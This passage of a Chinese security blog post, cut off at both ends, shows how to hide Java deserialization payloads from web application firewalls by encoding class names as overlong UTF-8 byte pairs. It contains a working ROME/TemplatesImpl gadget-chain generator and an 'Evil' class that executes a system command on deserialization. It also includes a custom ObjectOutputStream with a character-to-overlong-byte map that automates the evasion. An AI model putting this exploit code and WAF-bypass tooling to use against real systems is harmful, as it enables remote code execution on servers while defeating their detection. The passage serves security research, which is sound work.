com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="comment">//BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">//ToStringBean.toString()</span></span><br><span class="line"><span class="comment">//ToStringBean.toString(String)</span></span><br><span class="line"><span class="comment">//TemplatesImpl.getOutputProperties()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rome_BadAttributeValueExpException</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;target/classes/TemplatesImpl_RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templatesClass);<span class="comment">//防止提前触发</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException, toStringBean);</span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        java.io.<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(Filename);</span><br><span class="line">        java.io.<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>序列化后如下</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613151824867.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613151824867.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250613151824867"></p>
+<p>很显然WAF不会对乱码进行进行匹配，而是对可见字符进行匹配</p>
+<p>如果我们能利用解析问题去让我们的可见字符也变成乱码，使WAF不能识别，而程序能顺利进行，就顺利的达到了目标</p>
+<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>1ue1uekin8找到了readObject中对类名的解析</p>
+<p>上面的demo readObject有很多嵌套，不太适合调试，我们用一个简单的Evil demo调试</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.TestCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Evil</span> <span class="variable">evil</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line">        serialize(evil);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        java.io.<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(Filename);</span><br><span class="line">        java.io.<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>跟进readObject，经过如下栈，来到readUTFSpan</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">readUTFSpan:<span class="number">3625</span>, ObjectInputStream$BlockDataInputStream (java.io)</span><br><span class="line">readUTFBody:<span class="number">3596</span>, ObjectInputStream$BlockDataInputStream (java.io)</span><br><span class="line">readUTF:<span class="number">3400</span>, ObjectInputStream$BlockDataInputStream (java.io)</span><br><span class="line">readUTF:<span class="number">1210</span>, ObjectInputStream (java.io)</span><br><span class="line">readNonProxy:<span class="number">768</span>, ObjectStreamClass (java.io)</span><br><span class="line">readClassDescriptor:<span class="number">968</span>, ObjectInputStream (java.io)</span><br><span class="line">readNonProxyDesc:<span class="number">2000</span>, ObjectInputStream (java.io)</span><br><span class="line">readClassDesc:<span class="number">1875</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">2209</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1692</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">508</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">466</span>, ObjectInputStream (java.io)</span><br><span class="line">unserialize:<span class="number">30</span>, Evil (org.example.TestCode)</span><br><span class="line">main:<span class="number">17</span>, Evil (org.example.TestCode)</span><br></pre></td></tr></table></figure>
+
+<p>readUTFSpan完成了从字节缓冲区中读取一段UTF-8编码的字符串，转换为字符并追加到StringBuilder中，返回实际读取的字节数。</p>
+<p>从代码注释我们可以看出，取出当前字节的高4位去判定属于哪个模板。</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613153140853.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613153140853.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250613153140853"></p>
+<p>buf[pos++]：从缓冲区中取出当前 pos 位置的字节，并将 pos 后移一位；<br>&amp; 0xFF：将字节值无符号扩展为 int，确保结果为 0~255 的非负整数。</p>
+<p><code>&gt;&gt;</code>代表高4位</p>
+<p>看代码可以知道，只对模板进行了判断就继续解析了。比如双字节的判定，先判断第一个字节是否为<code>1110xxxxx</code>模板，然后判断第二个字节是否为<code>10xxxxxx</code>。可以看到并没有去判断我们上面所说的像python一样验证码点范围是否处于对应的区间。</p>
+<h3 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h3><p>我们试着把org.example.Evil的第一个字符o进行双字节UTF-8混淆，其16进制为0x6f</p>
+<p>如果是单字节的情况，o会以<code>0xxxxxxx</code>的模板去解析</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613153831825.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613153831825.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250613153831825"></p>
+<p>我们改造成用双字节的模板去解析：</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613153916272.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613153916272.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250613153916272"></p>
+<p>我们把对应的6F(01101111)</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613154335870.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613154335870.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250613154335870"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613154515707.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613154515707.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250613154515707"></p>
+<p>双字节模板110xxxxx 10xxxxxx</p>
+<p>填充11101111后，得到o的双字节 11100001 101101111，也就是16进制的C1 AF</p>
+<p>（本插件按Insert后开启插入模式修改数据）</p>
+<p>修改后可以看到已经变成了乱码</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613155546316.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613155546316.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250613155546316"></p>
+<p>我们保存后继续反序列化。</p>
+<p>控制台进行了报错：</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613155823491.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613155823491.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250613155823491"></p>
+<p>因为我们把一个字节改成了两个字节的原因，utflen却没变，导致提前结束了对类名的读取</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613160134433.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613160134433.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250613160134433"></p>
+<p>修改后即顺利读取</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613160512708.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613160512708.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250613160512708"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613160623993.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613160623993.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250613160623993"></p>
+<p>这样就能实现反序列化的同时字节码不可被WAF读取</p>
+<h3 id="工程化利用"><a href="#工程化利用" class="headerlink" title="工程化利用"></a>工程化利用</h3><p>我们跟进writeObject到writeNonProxy</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">writeNonProxy:<span class="number">818</span>, ObjectStreamClass (java.io)</span><br><span class="line">writeClassDescriptor:<span class="number">668</span>, ObjectOutputStream (java.io)</span><br><span class="line">writeNonProxyDesc:<span class="number">1282</span>, ObjectOutputStream (java.io)</span><br><span class="line">writeClassDesc:<span class="number">1231</span>, ObjectOutputStream (java.io)</span><br><span class="line">writeOrdinaryObject:<span class="number">1427</span>, ObjectOutputStream (java.io)</span><br><span class="line">writeObject0:<span class="number">1178</span>, ObjectOutputStream (java.io)</span><br><span class="line">writeObject:<span class="number">348</span>, ObjectOutputStream (java.io)</span><br><span class="line">serialize:<span class="number">24</span>, Evil (org.example.TestCode)</span><br><span class="line">main:<span class="number">16</span>, Evil (org.example.TestCode)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里调用的writeUTF去写入的类名</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613162036367.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250613162036367.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250613162036367"></p>
+<p>把writeUTF修改如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line"><span class="comment">//        writeUTF(desc.getName());</span></span><br><span class="line">        writeShort(name.length() * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; name.length(); i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">s</span> <span class="operator">=</span> name.charAt(i);</span><br><span class="line"><span class="comment">//            System.out.println(s);</span></span><br><span class="line">            write(map.get(s)[<span class="number">0</span>]);</span><br><span class="line">            write(map.get(s)[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为writeNonProxy是privite方法，可以直接重载ObjectOutputStream.writeClassDescriptor，除了修改开始的writeUTF，剩下的部分继续粘贴进去就行了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exploit.misc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomObjectOutputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectOutputStream</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> HashMap&lt;Character, <span class="type">int</span>[]&gt; map;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&#x27;_&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x9f</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;.&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc0</span>, <span class="number">0xae</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;;&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc0</span>, <span class="number">0xbb</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;$&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc0</span>, <span class="number">0xa4</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;[&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x9b</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;]&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0x9d</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;a&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa1</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;b&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa2</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;c&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa3</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;d&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa4</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;e&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa5</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;f&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa6</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;g&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa7</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;h&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa8</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;i&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xa9</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;j&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xaa</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;k&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xab</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;l&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xac</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;m&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xad</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;n&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xae</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;o&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xaf</span>&#125;); <span class="comment">// 0x6f</span></span><br><span class="line">        map.put(<span class="string">&#x27;p&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb0</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;q&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb1</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;r&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb2</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb3</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;t&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb4</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;u&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb5</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;v&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb6</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;w&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb7</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;x&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb8</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;y&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span class="number">0xb9</span>&#125;);</span><br><span class="line">        map.put(<span class="string">&#x27;z&#x27;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0xc1</span>, <span 